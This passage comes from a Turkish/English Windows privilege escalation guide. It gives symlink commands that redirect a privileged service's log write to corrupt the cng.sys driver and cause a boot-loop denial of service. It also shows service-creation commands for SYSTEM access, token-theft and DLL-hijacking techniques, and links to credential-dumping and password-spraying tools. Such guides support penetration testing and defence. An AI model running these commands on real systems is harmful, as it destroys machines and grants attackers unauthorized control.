mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. admin "send test SMS" tetikler). Yazma artık `C:\Windows\System32\cng.sys` içine düşer.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma Windows’un değiştirilmiş driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu ayrıca, ayrıcalıklı bir service’in yazmak için açacağı herhangi bir protected file için de genellenebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` içinde bir kopya varsa önce bu denenebilir; bu da onu bozuk data için güvenilir bir DoS sink haline getirir.



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken, geçerli bir service olduğundan veya binary’nin gerekli işlemleri mümkün olduğunca hızlı yaptığından emin olun; aksi halde geçerli bir service değilse 20 saniye içinde öldürülür.

### AlwaysInstallElevated

High Integrity bir process’ten **AlwaysInstallElevated registry entries**’ini etkinleştirmeyi ve bir _**.msi**_ wrapper kullanarak bir reverse shell kurmayı deneyebilirsiniz.\
[İlgili registry key’leri hakkında daha fazla bilgi ve bir _.msi_ package’ın nasıl kurulacağı burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu burada bulabilirsiniz** [**here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Bu token privileges’lere sahipseniz (muhtemelen bunu zaten High Integrity bir process içinde bulacaksınız), **neredeyse herhangi bir process’i** (protected processes değil) SeDebug privilege ile **açabilecek**, process’in **token’ını kopyalayabilecek** ve bu token ile **keyfi bir process oluşturabileceksiniz**.\
Bu teknik genellikle **SYSTEM olarak çalışan ve tüm token privileges’lere sahip herhangi bir process’i seçmek** için kullanılır (_evet, tüm token privileges’lere sahip olmayan SYSTEM process’leri bulabilirsiniz_).\
**Önerilen tekniği çalıştıran bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu technique, meterpreter tarafından `getsystem` içinde privilege escalation için kullanılır. Technique, **bir pipe oluşturup ardından o pipe’a yazması için bir service oluşturma/kötüye kullanma** işlemlerinden oluşur. Ardından, **`SeImpersonate`** privilege’ını kullanarak pipe’ı oluşturan **server**, pipe client’ının (service’in) **token’ını impersonate** edebilir ve SYSTEM privileges elde eder.\
Name pipes hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okumalısınız**](#named-pipe-client-impersonation).\
High integrity’den System’e name pipes kullanarak nasıl geçileceğine dair bir örnek okumak istiyorsanız [**bunu okumalısınız**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer **SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll’yi **hijack** etmeyi başarırsanız, o yetkilerle keyfi code çalıştırabilirsiniz. Bu nedenle Dll Hijacking de bu tür privilege escalation için faydalıdır ve ayrıca high integrity bir process’ten çok daha **kolay elde edilir**, çünkü dll’leri yüklemek için kullanılan klasörlerde **write permissions** olacaktır.\
**Dll hijacking hakkında daha fazla bilgi edinebilirsiniz** [**burada**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vektörlerini bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Misconfiguration’ları ve sensitive files’ları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası misconfiguration’ları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Misconfiguration’ları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı session bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager’dan crendentials çıkarır. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan passwords’ları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle tool’dur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerabilities’larını arar (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerabilities’larını arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Misconfiguration arayan host’u enumerate eder (privesc’ten çok bilgi toplama tool’udur) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok software’den credentials çıkarır (github’da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp’ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Misconfiguration kontrol eder (github’da precompiled executable). Tavsiye edilmez. Win10’da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası misconfiguration’ları kontrol eder (python’dan exe). Tavsiye edilmez. Win10’da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu post’a dayanarak oluşturulan tool (doğru çalışması için accesschk gerekmez ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploits önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploits önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak compile etmeniz gerekir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef host’ta kurulu .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
